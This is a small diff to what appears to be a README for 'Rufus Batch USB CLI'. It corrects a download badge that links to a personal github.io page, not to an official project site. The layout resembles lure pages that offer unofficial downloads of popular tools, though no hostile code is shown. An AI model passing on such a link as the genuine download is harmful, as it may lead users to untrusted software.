@@ -2,7 +2,7 @@
 
 ![Rufus Batch USB CLI](https://cdn.neowin.com/news/images/uploaded/2026/04/1777551269_rufus.webp)
 
-[![GET Rufus Batch USB CLI](https://img.shields.io/badge/GET%20%E2%80%94%20Rufus%20Batch%20USB%20CLI-0078D6?style=for-the-badge&logoColor=white)](https://lisanarimanea842.github.io/.github/Rufus-Batch-USB CLI)
+[![GET Rufus Batch USB CLI](https://img.shields.io/badge/GET%20%E2%80%94%20Rufus%20Batch%20USB%20CLI-0078D6?style=for-the-badge&logoColor=white)](https://lisanarimanea842.github.io/.github/Rufus-Batch-USB-CLI)
 
 ---
 
